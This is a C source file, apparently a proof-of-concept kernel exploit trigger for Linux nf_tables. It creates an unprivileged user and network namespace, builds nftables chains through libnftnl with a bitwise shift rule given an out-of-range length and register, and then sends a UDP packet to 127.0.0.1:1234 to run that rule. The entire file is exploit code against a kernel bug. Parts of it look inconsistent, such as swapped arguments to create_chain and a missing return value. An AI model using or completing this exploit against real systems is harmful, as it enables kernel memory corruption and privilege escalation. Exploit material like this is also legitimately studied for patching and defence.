#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <sched.h>
#include <signal.h>
#include <assert.h>

#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

// libmnl: minimalistic user-space library oriented to Netlink developers
#include <libmnl/libmnl.h>

// libnftnl: a userspace library providing a low-level netlink API to the nf_tables
// a wrapper library of libmnl
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#define offsetof(TYPE, MEMBER)	__builtin_offsetof(TYPE, MEMBER)
#define sizeof_field(TYPE, MEMBER) sizeof((((TYPE *)0)->MEMBER))

enum {
    NFT_TYPE_TABLE = 0,
    NFT_TYPE_CHAIN,
    NFT_TYPE_RULE
};

struct unft_base_chain_param {
    uint32_t hook_num;
    uint32_t prio;
};

void rule_add_bitwise(struct nftnl_rule *r, uint32_t op, uint32_t len,
        uint32_t sreg, uint32_t dreg, void *data, uint32_t data_len);
void rule_add_payload(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t dreg);
void rule_add_cmp(struct nftnl_rule *r, uint32_t op, uint32_t sreg, void* data, size_t data_len);
void rule_add_immediate_data(struct nftnl_rule *r, uint32_t dreg, void *data, size_t data_len);
void rule_add_immediate_verdict(struct nftnl_rule *r, uint32_t verdict, char *chain_name);

void exit_log(const char *msg)
{
    perror(msg);
    exit(1);
}
/* some API explanation
   mnl_nlmsg_batch_current - returns current position in the batch
   mnl_nlmsg_batch_next - get room for the next message in the batch
   mnl_nlmsg_batch_size - get current size of the batch
   mnl_nlmsg_batch_stop - release a batch
   mnl_socket_sendto - send a netlink message of a certain size
   mnl_cb_run - callback runqueue for netlink messages (simplified version)
*/

int64_t default_batch_req_handler(struct mnl_socket *nl, int portid, int table_seq)
{
    char mnl_buf[MNL_SOCKET_BUFFER_SIZE];
    int ret = mnl_socket_recvfrom(nl, mnl_buf, sizeof(mnl_buf));

    while (ret > 0) {
        ret = mnl_cb_run(mnl_buf, ret, table_seq, portid, NULL, NULL);
        if (ret <= 0) // STOP = 0, ERROR <= -1
            break;
        // OK >= 1, continue
        ret = mnl_socket_recvfrom(nl, mnl_buf, sizeof(mnl_buf));
    }
    return ret;
}

int64_t send_batch_request(struct mnl_socket *nl, uint16_t msg_type,
        uint16_t nft_type, uint16_t msg_flags,
        uint16_t family, void **object, int *seq,
        int64_t (*result_handler)(struct mnl_socket*, int, int))
{
    char mnl_buf[MNL_SOCKET_BUFFER_SIZE];
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_buf, sizeof(mnl_buf));

    if (result_handler == NULL)
        result_handler = default_batch_req_handler;

    // START of batch
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), (*seq)++);
    mnl_nlmsg_batch_next(batch);

    int table_seq = *seq;
    struct nlmsghdr *nlh;
    nlh = nftnl_nlmsg_build_hdr(
            mnl_nlmsg_batch_current(batch),
            msg_type, family, msg_flags | NLM_F_ACK, (*seq)++
            );

    switch (nft_type) {
        case NFT_TYPE_TABLE:
            nftnl_table_nlmsg_build_payload(nlh, *object);
            nftnl_table_free(*object);
            break;
        case NFT_TYPE_CHAIN:
            nftnl_chain_nlmsg_build_payload(nlh, *object);
            nftnl_chain_free(*object);
            break;
        case NFT_TYPE_RULE:
            nftnl_rule_nlmsg_build_payload(nlh, *object);
            nftnl_rule_free(*object);
            break;
    }
    *object = NULL;

    // END of batch
    mnl_nlmsg_batch_next(batch);
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), (*seq)++);
    mnl_nlmsg_batch_next(batch);

    int ret = mnl_socket_sendto(
            nl,
            mnl_nlmsg_batch_head(batch),
            mnl_nlmsg_batch_size(batch)
            );

    if (ret < 0)
        exit_log("mnl_socket_sendto");

    int portid = mnl_socket_get_portid(nl);
    mnl_nlmsg_batch_stop(batch);
    result_handler(nl, portid, table_seq);
}

struct nftnl_table *build_table(char *name, uint16_t family)
{
    struct nftnl_table *t = nftnl_table_alloc();
    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);
    return t;
}

struct nftnl_chain *build_chain(char *table_name, char *chain_name,
        struct unft_base_chain_param *base_param)
{
    struct nftnl_chain *c = nftnl_chain_alloc();
    nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table_name);

    if (base_param) {
        nftnl_chain_set_u32(c, NFTNL_CHAIN_HOOKNUM, base_param->hook_num);
        nftnl_chain_set_u32(c, NFTNL_CHAIN_PRIO, base_param->prio);
    }

    return c;
}

void rule_add_bitwise(struct nftnl_rule *r, uint32_t op, uint32_t len,
        uint32_t sreg, uint32_t dreg, void *data, uint32_t data_len)
{
    // check in kernel function nft_parse_u32_check
    assert(len <= 0xff);

    struct nftnl_expr *e = nftnl_expr_alloc("bitwise");
    // nft_bitwise_attributes
    nftnl_expr_set_u32(e, NFTA_BITWISE_SREG, sreg);
    nftnl_expr_set_u32(e, NFTA_BITWISE_DREG, dreg);
    nftnl_expr_set_u32(e, NFTA_BITWISE_OP, op); // nft_bitwise_ops
    nftnl_expr_set_u32(e, NFTA_BITWISE_LEN, len);
    nftnl_expr_set_data(e, NFTA_BITWISE_DATA, data, data_len);
    nftnl_rule_add_expr(r, e);
}

void rule_add_payload(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t dreg)
{
    struct nftnl_expr *e = nftnl_expr_alloc("payload");
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
    nftnl_rule_add_expr(r, e);
}

void rule_add_cmp(struct nftnl_rule *r, uint32_t op, uint32_t sreg, void* data, size_t data_len)
{
    struct nftnl_expr *e;
    e = nftnl_expr_alloc("cmp");
    nftnl_expr_set_u32(e, NFTA_CMP_OP, op); // nft_cmp_ops
    nftnl_expr_set_u32(e, NFTA_CMP_SREG, sreg);
    nftnl_expr_set_data(e, NFTA_CMP_DATA, data, data_len);
    nftnl_rule_add_expr(r, e);
}

void rule_add_immediate_data(struct nftnl_rule *r, uint32_t dreg, void *data, size_t data_len)
{
    struct nftnl_expr *e = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, dreg);
    nftnl_expr_set_data(e, NFTA_IMMEDIATE_DATA, data, data_len);
    nftnl_rule_add_expr(r, e);
}

void rule_add_immediate_verdict(struct nftnl_rule *r, uint32_t verdict, char *chain_name)
{
    struct nftnl_expr *e = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, 0); 
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict);
    if (verdict == NFT_GOTO || verdict == NFT_JUMP) {
        // goto other chain?
        nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, chain_name);
    }
    nftnl_rule_add_expr(r, e);
}

int64_t create_table(struct mnl_socket *nl, char *name, uint16_t family, int *seq,
        int64_t (*result_handler)(struct mnl_socket*, int, int))
{
    struct nftnl_table *t = build_table(name, family);
    return send_batch_request(
            nl, NFT_MSG_NEWTABLE, NFT_TYPE_TABLE,
            NLM_F_CREATE, family, (void **)&t, seq,
            result_handler
            );
}

int64_t create_chain(struct mnl_socket *nl, char *chain_name,
        char *table_name, uint16_t family,
        struct unft_base_chain_param *base_param, int *seq,
        int64_t (*result_handler)(struct mnl_socket*, int, int))
{
    struct nftnl_chain *c = build_chain(chain_name, table_name, base_param);
    return send_batch_request(
            nl, NFT_MSG_NEWCHAIN, NFT_TYPE_CHAIN,
            NLM_F_CREATE, family, (void **)&c, seq,
            result_handler
            );
}

int64_t create_rule1(struct mnl_socket *nl, char *table_name, uint16_t family, int *seq,
        int64_t (*result_handler)(struct mnl_socket*, int, int))
{
    int val = 0;
    struct nftnl_rule* r = nftnl_rule_alloc();
    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, "chain-1");
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

    // transport layer: L3
    rule_add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, offsetof(struct udphdr, dest),
                    sizeof_field(struct udphdr, dest), NFT_REG32_00);

    // check if dest port and 1234 (big endian)
    val = 0xd204;
    rule_add_cmp(r, NFT_CMP_EQ, NFT_REG32_00, &val, sizeof(val));

    // inner header: L4, L5
    rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, 0,
                     4, NFT_REG32_00);

    // check if payload start with magic number
    val = 0x41414141;
    rule_add_cmp(r, NFT_CMP_EQ, NFT_REG32_00, &val, sizeof(val));

    // jump to chain 2
    rule_add_immediate_verdict(r, NFT_JUMP, "chain-2");

    return send_batch_request(
            nl, NFT_MSG_NEWRULE, NFT_TYPE_RULE,
            NLM_F_CREATE, family, (void **)&r, seq,
            result_handler
            );
}

int64_t create_rule2(struct mnl_socket *nl, char *table_name, uint16_t family, int *seq,
        int64_t (*result_handler)(struct mnl_socket*, int, int))
{
    int val = 0;
    struct nftnl_rule* r = nftnl_rule_alloc();
    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, "chain-2");
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

    rule_add_bitwise(r,
            NFT_BITWISE_LSHIFT,
            0x20, 0x3fffffff, // update this
            NFT_REG32_00, &val, sizeof(val));

    return send_batch_request(
            nl, NFT_MSG_NEWRULE, NFT_TYPE_RULE,
            NLM_F_CREATE, family, (void **)&r, seq,
            result_handler
            );
}

int64_t update_rule2(struct mnl_socket *nl, char *table_name, uint16_t family, int *seq,
        int64_t (*result_handler)(struct mnl_socket*, int, int))
{
    int val = 0;
    struct nftnl_rule* r = nftnl_rule_alloc();
    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, "chain-2");
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

    rule_add_bitwise(r,
            NFT_BITWISE_LSHIFT,
            0x20, 0x3ffffffc,
            NFT_REG32_00, &val, sizeof(val));

    return send_batch_request(
            nl, NFT_MSG_NEWRULE, NFT_TYPE_RULE,
            NLM_F_REPLACE, family, (void **)&r, seq,
            result_handler
            );
}

void unshare_setup()
{
    int fd;
    char buf[64];
    uid_t u = getuid();
    gid_t g = getgid();

    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
    fd = open("/proc/self/setgroups", O_WRONLY);
    write(fd, "deny", strlen("deny"));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buf, sizeof(buf), "0 %d 1", u);
    write(fd, buf, strlen(buf));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buf, sizeof(buf), "0 %d 1", g);
    write(fd, buf, strlen(buf));
    close(fd);
}

void setup_nftables(struct mnl_socket *nl, char *table_name, int *seq)
{
    int ret;

    ret = create_table(nl, "table-1", AF_INET, seq, NULL);
    if (ret == -1)
        exit_log("create_table");

    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_OUT;
    bp.prio = 10;

    ret = create_chain(nl, "table-1", "chain-1", NFPROTO_IPV4, &bp, seq, NULL);
    if (ret == -1)
        exit_log("create_chain-1");

    ret = create_chain(nl, "table-1", "chain-2", NFPROTO_IPV4, NULL, seq, NULL);
    if (ret == -1)
        exit_log("create_chain-2");

    ret = create_rule2(nl, "table-1", NFPROTO_IPV4, seq, NULL);
    if (ret == -1)
        exit_log("create_rule-2");

    ret = create_rule1(nl, "table-1", NFPROTO_IPV4, seq, NULL);
    if (ret == -1)
        exit_log("create_rule-1");

}

void trigger()
{
    int sockfd;
    struct sockaddr_in server_addr;
    char buf[128];
    int ret;

    // sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
        exit_log("socket");

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(1234);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    memset(buf, 'A', sizeof(buf));
    ret = sendto(sockfd, buf, sizeof(buf), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    sleep(10000);
    close(sockfd);
}

int main()
{
    int ret;
    int seq;

    //////////////////////////////////
    unshare_setup();
    system("ip link set dev lo up");

    struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
    ret = mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID);
    if (ret != 0)
        exit_log("mnl_socket_bind");

    seq = 0;
    setup_nftables(nl, "table-1", &seq);

    /////////////////////////////////
    trigger();
    return 0;
}

